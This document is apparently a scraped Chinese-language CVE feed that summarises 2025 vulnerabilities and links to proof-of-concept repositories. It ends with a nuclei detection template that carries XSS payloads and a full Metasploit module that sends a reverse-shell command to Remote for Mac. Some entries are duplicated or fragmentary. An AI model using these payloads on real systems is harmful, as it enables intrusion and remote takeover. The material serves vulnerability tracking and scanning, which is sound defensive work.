漏洞描述： CVE-2025-5054是Ubuntu系统中Apport的一个竞态条件漏洞，允许本地信息泄露。此漏洞影响Apport版本2.32.0及以下。该工具可以检测系统是否运行Ubuntu，检查Apport是否安装及其版本，确定安装的Apport版本是否易受攻击，检查Apport是否配置为核心转储处理程序，验证缓解设置（如suid_dumpable），查找常见攻击向量（如SUID/SGID unix_chkpwd），并提供清晰的摘要和可操作的建议。

产品厂商： Ubuntu

产品名称： Apport

影响版本： ≤ 2.32.0

来源： https://github.com/daryllundy/cve-2025-5054

类型： CVE-2025:github search

entry.title: Roundcube Webmail 反序列化漏洞
entry.content:
漏洞名称： Roundcube Webmail 反序列化漏洞

漏洞编号：

  • CVE： CVE-2025-49113

漏洞类型： 反序列化

漏洞等级： 严重

漏洞描述： CVE-2025-49113是影响Roundcube Webmail版本1.5.10之前和1.6.11之前的一个严重漏洞。该漏洞通过在/settings/upload.php端点中的PHP对象反序列化，允许经过身份验证的用户在服务器上执行任意代码。漏洞源于对_from参数的不当处理，攻击者可利用此漏洞获取未授权访问、窃取数据或完全控制服务器。此漏洞已在Roundcube版本1.5.10（LTS）和1.6.11中修复，作为2025年6月安全更新的一部分发布。

产品厂商： Roundcube

产品名称： Roundcube Webmail

影响版本： version < 1.5.10, version < 1.6.11

来源： https://github.com/rasool13x/exploit-CVE-2025-49113

类型： CVE-2025:github search

entry.title: SureTriggers WordPress插件认证绕过漏洞
entry.content:
漏洞名称： SureTriggers WordPress插件认证绕过漏洞

漏洞编号：

  • CVE： CVE-2025-3102

漏洞类型： 权限绕过

漏洞等级： 高危

漏洞描述： SureTriggers WordPress插件存在一个认证绕过漏洞，允许未认证的攻击者创建管理员账户。这是由于在autheticate_user函数中对secret_key缺少空值检查。当插件安装并激活但未配置API密钥时，攻击者可以通过发送空的st_authorization头部绕过认证，触发保留给认证用户的操作。此漏洞影响版本≤1.0.78，严重性为高危(8.1)。

产品厂商： SureTriggers

产品名称： SureTriggers – All-in-One Automation Platform WordPress plugin

影响版本： ≤ 1.0.78

来源： https://github.com/B1ack4sh/CVE-2025-3102

类型： CVE-2025:github search

entry.title: WordPress Eventin 任意文件读取漏洞
entry.content:
漏洞名称： WordPress Eventin 任意文件读取漏洞

漏洞编号：

  • CVE： CVE-2025-3419

漏洞类型： 文件读取

漏洞等级： 严重

漏洞描述： WordPress的Eventin插件（版本<=4.0.26）包含一个未经身份验证的任意文件读取漏洞。攻击者可以通过操纵url参数来获取服务器文件（如/etc/passwd，wp-config.php）。该功能未能限制对本地文件路径的访问，允许目录遍历（如../../）。这暴露了敏感数据，如数据库凭证、API密钥和系统文件。该漏洞源于文件操作前缺少清理检查。

产品厂商： WordPress

产品名称： Eventin

影响版本： <= 4.0.26

来源： https://github.com/Yucaerin/CVE-2025-3419

类型： CVE-2025:github search

漏洞名称： PHPGurukul Hostel Management System 存储型跨站脚本漏洞

漏洞编号：

  • CVE： CVE-2025

漏洞类型： 跨站可执行脚本

漏洞等级： 高危

漏洞描述： 在PHPGurukul的Hostel Management System中发现了一个严重的存储型跨站脚本(XSS)漏洞。攻击者可以通过名称字段(POST参数)注入恶意JavaScript，这些脚本会被持久存储在数据库中，并在查看个人资料页面时执行。漏洞存在于投诉系统模块，攻击向量是通过POST请求的name参数。

产品厂商： PHPGurukul

产品名称： Hostel Management System

entry.title: Fortinet 缓冲区溢出漏洞
entry.content:
漏洞名称： Fortinet 缓冲区溢出漏洞

漏洞编号：

  • CVE： CVE-2025-32756

漏洞类型： 缓冲区溢出

漏洞等级： 严重

漏洞描述： CVE-2025-32756是影响多个Fortinet产品的严重栈缓冲区溢出漏洞。该漏洞存在于处理/remote/hostcheck_validate端点的enc参数时，由于不正确的边界检查导致缓冲区溢出，允许未经认证的远程代码执行。受影响的Fortinet产品包括FortiVoice、FortiMail、FortiNDR、FortiRecorder和FortiCamera。

产品厂商： Fortinet

产品名称： FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera

影响版本： FortiVoice: version < 7.2.1, version < 7.0.7, version < 6.4.11; FortiMail: version < 7.6.3, version < 7.4.5, version < 7.2.8, version < 7.0.9; FortiNDR: version < 7.6.1, version < 7.4.8, version < 7.2.5, version < 7.0.7; FortiRecorder: version < 7.2.4, version < 7.0.6, version < 6.4.6; FortiCamera: version < 2.1.4

来源： https://github.com/kn0x0x/CVE-2025-32756-POC

类型： CVE-2025:github search

漏洞类型： 权限提升

漏洞等级： 高危

漏洞描述： HyperComments WordPress插件存在权限提升漏洞，由于在hc_request_handler函数中缺少能力检查，攻击者可以未经授权修改数据，导致权限提升。此漏洞允许未认证的攻击者更新WordPress站点上的任意选项，包括将注册默认角色更新为管理员，并启用用户注册，从而获得对受影响站点的管理员用户访问权限。

entry.title: Google Chrome V8 Out-of-Bounds Write Vulnerability
entry.content:
漏洞名称： Google Chrome V8 Out-of-Bounds Write Vulnerability

漏洞编号：

  • CVE： CVE-2025-5419

漏洞类型： 缓冲区溢出

漏洞等级： 严重

漏洞描述： Google Chrome V8 JavaScript引擎中存在一个严重的越界写入漏洞（CVE-2025-5419），影响版本至137.0.7151.68。该漏洞源于V8在优化的JIT编译过程中不当处理内存边界。在特定条件下，攻击者可以通过精心构造的HTML+JavaScript负载触发内存损坏，导致堆损坏和远程代码执行。漏洞利用需要用户交互（如访问恶意网站），无需认证。

产品厂商： Google

产品名称： Google Chrome

影响版本： ≤ 137.0.7151.68

entry.title: CVE-2025-3054 Exploit

entry.title: Roundcube Webmail 反序列化漏洞
entry.content:
漏洞名称： Roundcube Webmail 反序列化漏洞

漏洞编号：

  • CVE： CVE-2025-49113

漏洞类型： 反序列化

漏洞等级： 严重

漏洞描述： Roundcube Webmail在1.5.10之前和1.6.x在1.6.11之前的版本中，由于program/actions/settings/upload.php中的_from参数未经过验证，导致经过身份验证的用户可以远程执行代码，引发PHP对象反序列化漏洞。

产品厂商： roundcube

产品名称： webmail

影响版本： version < 1.5.10 or (version >= 1.6.0 and version < 1.6.11)

来源： https://github.com/projectdiscovery/nuclei-templates/blob/9243c22e007e9563ec8780063d12ec132fc232e2/http%2Fcves%2F2025%2FCVE-2025-49113.yaml

entry.title: Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution
entry.content:
漏洞名称： Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution

漏洞编号：

  • CVE： CVE-2025-4427, CVE-2025-4428

漏洞类型： 命令执行

漏洞等级： 严重

漏洞描述： 该模块利用了Ivanti EPMM中的未认证远程代码执行漏洞链，跟踪为CVE-2025-4427和CVE-2025-4428。一个认证缺陷允许未认证访问管理员Web API端点，从而允许通过表达式语言注入执行代码。此模块在’tomcat’用户上下文中执行。此模块也适用于许多版本的MobileIron Core（重新命名为Ivanti EPMM）。

产品厂商： Ivanti

产品名称： Ivanti EPMM

来源： https://github.com/rapid7/metasploit-framework/blob/26156dfac2e01379eb858a87aa85e2ecfea929ff/modules%2Fexploits%2Fmulti%2Fhttp%2Fivanti_epmm_rce_cve_2025_4427_4428.rb

entry.title: Abandoned Cart Lite for WooCommerce 认证绕过漏洞
entry.content:
漏洞名称： Abandoned Cart Lite for WooCommerce 认证绕过漏洞

漏洞编号：

  • CVE： CVE-2023-2986

漏洞类型： 权限绕过

漏洞等级： 严重

漏洞描述： WordPress的Abandoned Cart Lite for WooCommerce插件在5.14.2及之前版本中存在认证绕过漏洞。这是由于插件在废弃购物车链接解码过程中对用户提供的加密不足，导致未认证的攻击者可以以废弃购物车的用户（通常是客户）身份登录。5.15.1版本引入了进一步的安全加固措施，确保网站不再通过历史结账链接受到攻击，5.15.2版本引入了额外的加固措施，确保空键值不会允许认证绕过。

产品厂商： tychesoftwares

产品名称： Abandoned Cart Lite for WooCommerce

影响版本： version <= 5.14.2

搜索语法： body=”/wp-content/plugins/woocommerce-abandoned-cart/“

来源： https://github.com/projectdiscovery/nuclei-templates/blob/8c3b2aa357db8d955f41f3bbff541063b2b81964/http%2Fcves%2F2023%2FCVE-2023-2986.yaml

类型： projectdiscovery/nuclei-templates:github issues

entry.title: Metasploit remove_host Module Hard-coded Hosts File Path Vulnerability
entry.content:
漏洞名称： Metasploit remove_host Module Hard-coded Hosts File Path Vulnerability

漏洞类型： 配置问题

漏洞等级： 中危

漏洞描述： Metasploit Framework中的remove_host模块存在硬编码的主机文件路径问题，当Windows系统未安装在C盘时，模块无法正确找到hosts文件，导致功能失效。建议使用环境变量SystemRoot或windir动态确定hosts文件的正确位置。

产品厂商： rapid7

产品名称： Metasploit Framework

来源： https://github.com/rapid7/metasploit-framework/issues/20280

类型： rapid7/metasploit-framework:github issues

entry.title: Cisco IOS XE WLC 硬编码JWT未授权远程代码执行漏洞
entry.content:
漏洞名称： Cisco IOS XE WLC 硬编码JWT未授权远程代码执行漏洞

漏洞编号：

  • CVE： CVE-2025-20188

漏洞类型： 硬编码凭证

漏洞等级： 严重

漏洞描述： Cisco IOS XE Software for Wireless LAN Controllers (WLCs) 中存在一个严重的未授权远程代码执行漏洞，该漏洞源于Out-of-Band AP Image Download功能中使用了硬编码的JSON Web Token (JWT)。攻击者可以利用这个硬编码的JWT通过HTTPS POST请求向AP Image Download端点上传任意文件或webshell，并通过路径遍历触发上传的负载执行，从而在WLC上以root权限执行任意命令。需要注意的是，此功能默认禁用，仅当显式启用Out-of-Band Image Download的WLC才会受到此漏洞的影响。

产品厂商： Cisco

产品名称： IOS XE WLC (Out-of-Band AP Image Download)

影响版本： All builds with Out-of-Band AP Image Download enabled prior to fix release 17.12.1a

来源： https://github.com/takeshirisulu/CVE-2025-20188

类型： CVE-2025:github search

- README.md```

entry.content:

漏洞等级： 高危

漏洞描述： 该模块通过在/etc/periodic目录中写入脚本实现持久化。根据The Art of Mac Malware，目前没有恶意软件以这种方式持久化（2024年）。此有效载荷需要root权限才能运行。

entry.title: CrafterCMS Engine 跨站脚本漏洞
entry.content:
漏洞名称： CrafterCMS Engine 跨站脚本漏洞

漏洞编号：

  • CVE： CVE-2023-4136

漏洞类型： 跨站可执行脚本

漏洞等级： 中危

漏洞描述： CrafterCMS Engine存在反射型跨站脚本(XSS)漏洞，攻击者可通过/api/1/site/url/transform端点中的transformerName参数执行任意JavaScript代码，影响用户上下文。

产品厂商： craftercms

产品名称： CrafterCMS Engine

搜索语法： http.html:”craftercms” OR body=”craftercms”

来源： https://github.com/projectdiscovery/nuclei-templates/blob/395c54c37ba8f70dcfd5ca7cbcf42f8f0e8bc737/http%2Fcves%2F2023%2FCVE-2023-4136.yaml

类型： projectdiscovery/nuclei-templates:github issues

id: CVE-2023-4136info:  name: CrafterCMS Engine - Cross-Site Scripting  author: ritikchaddha  severity: medium  description: |    CrafterCMS Engine is vulnerable to reflected cross-site scripting (XSS) via the transformerName parameter in the /api/1/site/url/transform endpoint, allowing attackers to execute arbitrary JavaScript in the context of the user.  remediation: |    Update CrafterCMS Engine to the latest version that addresses this vulnerability.  reference:    - https://karmainsecurity.com/KIS-2023-09    - https://nvd.nist.gov/vuln/detail/CVE-2023-4136  classification:    cve-id: CVE-2023-4136    cwe-id: CWE-79    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N    cvss-score: 6.1  metadata:    verified: true    max-request: 1    vendor: craftercms    product: craftercms    shodan-query: http.html:"craftercms"    fofa-query: body="craftercms"  tags: cve,cve2023,craftercms,xsshttp:  - raw:      - |        GET /api/1/site/url/transform?transformerName=%3Cscript%20xmlns%3D%22http%3A//www.w3.org/1999/xhtml%22%3Ealert(document.domain)%3C/script%3E&url= HTTP/1.1        Host: {{Hostname}}        Accept: text/html,application/xhtml+xml      - |        GET /api/1/site/content_store/children?url=%3Cscript%20xmlns%3D%22http%3A//www.w3.org/1999/xhtml%22%3Ealert(document.domain)%3C/script%3E HTTP/1.1        Host: {{Hostname}}        Accept: text/html,application/xhtml+xml      - |        GET /api/1/site/content_store/item?url=%3Cscript%20xmlns%3D%22http%3A//www.w3.org/1999/xhtml%22%3Ealert(document.domain)%3C/script%3E HTTP/1.1        Host: {{Hostname}}        Accept: text/html,application/xhtml+xml    stop-at-first-match: true    matchers:      - type: dsl        dsl:          - 'status_code == 500 || status_code == 404'          - 'contains(content_type, "application/xhtml+xml")'          - 'contains(body, "<script xmlns=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</script>")'          - 'contains_any(body, "Url transformer", "No folder found at", "No item found at")'        condition: and```

漏洞类型： 未授权访问

漏洞等级： 高危

漏洞描述： 该模块利用了Remote for Mac版本至2025.7（包括补丁版本）中的未授权远程代码执行漏洞，通过/api/executeScript端点。当目标系统上禁用认证时，攻击者可以执行任意AppleScript命令，包括通过do shell script执行的shell命令。

产品名称： Remote for Mac

影响版本： version <= 2025.7

来源： https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb

类型： rapid7/metasploit-framework:github issues

require 'json'class MetasploitModule < Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::Remote::HttpClient  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Remote for Mac <= 2025.7 - Unauthenticated RCE',        'Description' => %q{          This module exploits an unauthenticated remote code execution vulnerability in          Remote for Mac versions up to and including 2025.7 via the /api/executeScript endpoint.          When authentication is disabled on the target system, it allows attackers to execute          arbitrary AppleScript commands, which can include shell commands via \`do shell script\`.          All versions up to 2025.7 (including patch versions) are vulnerable.        },        'License' => MSF_LICENSE,        'Author' => ['Chokri Hammedi (@blue0x1)'],        'References' => [          ['PACKETSTORM', '195347']        ],        'DisclosureDate' => '2025-05-27',        'Platform' => ['unix','osx'],        'Arch' => ARCH_CMD,        'Targets' => [['Auto', {}]],        'DefaultTarget' => 0,        'DefaultOptions' => {          'RPORT' => 49229,          'SSL' => true        },        'Notes' => {          'Stability' => ['CRASH_SAFE'],          'Reliability' => ['REPEATABLE_SESSION'],          'SideEffects' => ['ARTIFACTS_ON_DISK']        }      )    )  end  def check    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'api', 'getVersion'),      'method' => 'GET'    )    return CheckCode::Unknown('No response from target') unless res&.code == 200    info = res.get_json_document    if info.empty?      return CheckCode::Unknown('Unable to parse JSON from /api/getVersion')    end    if info.dig('requires.auth') == true      return CheckCode::Safe('Target requires authentication on /api/executeScript')    end    version = info.dig('version').to_s    if version.empty?      return CheckCode::Unknown('Could not determine target version')    end    begin      target_version = Rex::Version.new(version)      vulnerable_version = Rex::Version.new('2025.7')            if target_version <= vulnerable_version        return CheckCode::Appears      else        return CheckCode::Safe("Target version #{version} is not vulnerable")      end    rescue ArgumentError      return CheckCode::Unknown("Invalid version format: #{version}")    end  end  def exploit    print_status("Generating reverse shell payload for #{datastore['LHOST']}:#{datastore['LPORT']}")    cmd = payload.encoded    applescript = %(do shell script "#{cmd}")    host_name = Rex::Text.rand_text_alpha(8)    host_model = "#{Rex::Text.rand_text_alpha(4)}#{rand(99)}"    script_name = Rex::Text.rand_text_alpha(8)    print_status("Sending exploit to #{rhost}:#{rport} via AppleScript")    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'api', 'executeScript'),      'method' => 'GET',      'headers' => {        'X-ClientToken' => Rex::Text.rand_text_numeric(4),        'X-HostName' => host_name,        'X-HostFullModel' => host_model,        'X-Script' => applescript,        'X-ScriptName' => script_name,        'X-ScriptDelay' => '0'      }    )    if res&.code == 200      print_good('Payload delivered successfully. Awaiting session...')    else      fail_with(Failure::UnexpectedReply, "Unexpected HTTP response: #{res&.code || 'no response'}")    end  endend```
